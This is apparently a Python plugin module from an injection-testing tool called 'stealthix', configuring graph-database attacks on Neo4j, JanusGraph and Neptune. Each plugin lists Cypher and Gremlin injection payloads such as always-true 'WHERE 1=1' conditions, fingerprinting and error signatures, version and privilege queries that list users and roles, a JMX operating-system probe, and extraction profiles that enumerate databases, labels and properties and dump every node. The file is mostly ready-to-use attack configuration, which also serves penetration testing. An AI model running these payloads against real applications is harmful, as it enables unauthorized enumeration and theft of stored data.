from __future__ import annotations

from stealthix.plugins.base import Plugin

GRAPH_PLUGINS = [
    Plugin(
        "neo4j",
        "nosql",
        dbms="neo4j",
        payloads=['MATCH (n) WHERE n.field = "1" RETURN n', "MATCH (n) WHERE 1=1 RETURN n"],
        fingerprints=["neo4j", "cypher"],
        error_signatures=["neo4j", "cypher", "syntax error"],
        version_queries=["CALL dbms.components() YIELD name, version", "RETURN dbms.version()"],
        privilege_checks=["CALL dbms.security.listUsers()", "CALL dbms.security.listRoles()"],
        os_queries=['CALL dbms.queryJmx("java.lang:type=OperatingSystem")'],
        preferred_techniques="BETU",
        extraction_profiles={
            "databases": {
                "payloads": ["SHOW DATABASES", "CALL dbms.listDatabases()"],
                "patterns": [r"\bdatabase[:=\s]+([a-z0-9_\-]+)", r"\bdb[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": ["CALL db.labels()", "MATCH (n) RETURN DISTINCT labels(n)"],
                "patterns": [r"\blabel[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": [
                    "MATCH (n) RETURN keys(n) LIMIT 1",
                    "CALL db.schema.nodeTypeProperties()",
                ],
                "patterns": [r"\bproperty[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ["MATCH (n) WHERE 1=1 RETURN n", "MATCH (n) RETURN n"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "janusgraph",
        "nosql",
        dbms="janusgraph",
        payloads=['g.V().has("field", "1")', 'g.V().has("field",eq("1"))'],
        fingerprints=["janusgraph", "gremlin"],
        error_signatures=["janusgraph", "gremlin", "invalid"],
        version_queries=['g.V().has("name", "janusgraph").valueMap()', "g.V().count()"],
        privilege_checks=['g.V().has("label", "user")', 'g.E().hasLabel("permission")'],
        os_queries=['g.V().hasLabel("system")'],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": ['g.V().has("label", "graph")', 'g.V().hasLabel("graph")'],
                "patterns": [r"\bgraph[:=\s]+([a-z0-9_\-]+)", r"\bdatabase[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": ["g.V().label().dedup()", "g.V().hasLabel()"],
                "patterns": [r"\blabel[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": ["g.V().limit(1).valueMap().keys()", "g.V().properties().key()"],
                "patterns": [r"\bproperty[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ['g.V().has("field", "1")', "g.V()"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
    Plugin(
        "neptune",
        "nosql",
        dbms="neptune",
        payloads=['g.V().has("field", "1")', 'MATCH (n) WHERE n.field = "1" RETURN n'],
        fingerprints=["neptune", "gremlin", "sparql"],
        error_signatures=["neptune", "gremlin", "sparql", "invalid"],
        version_queries=['g.V().has("name", "neptune")', "CALL dbms.components()"],
        privilege_checks=['g.V().hasLabel("user")', "MATCH (u:User) RETURN u"],
        os_queries=['g.V().hasLabel("system")'],
        preferred_techniques="BET",
        extraction_profiles={
            "databases": {
                "payloads": ['g.V().hasLabel("graph")', "SHOW DATABASES"],
                "patterns": [r"\bgraph[:=\s]+([a-z0-9_\-]+)", r"\bdatabase[:=\s]+([a-z0-9_\-]+)"],
            },
            "tables": {
                "payloads": ["g.V().label().dedup()", "MATCH (n) RETURN DISTINCT labels(n)"],
                "patterns": [r"\blabel[:=\s]+([a-z0-9_\-]+)", r"\btable[:=\s]+([a-z0-9_\-]+)"],
            },
            "columns": {
                "payloads": [
                    "g.V().limit(1).valueMap().keys()",
                    "MATCH (n) RETURN keys(n) LIMIT 1",
                ],
                "patterns": [r"\bproperty[:=\s]+([a-z0-9_\-]+)", r"\bcolumn[:=\s]+([a-z0-9_\-]+)"],
            },
            "dump": {
                "payloads": ['g.V().has("field", "1")', "MATCH (n) WHERE 1=1 RETURN n"],
            },
            "files": {"disabled": True},
            "os": {"disabled": True},
        },
    ),
]

__all__ = ["GRAPH_PLUGINS"]
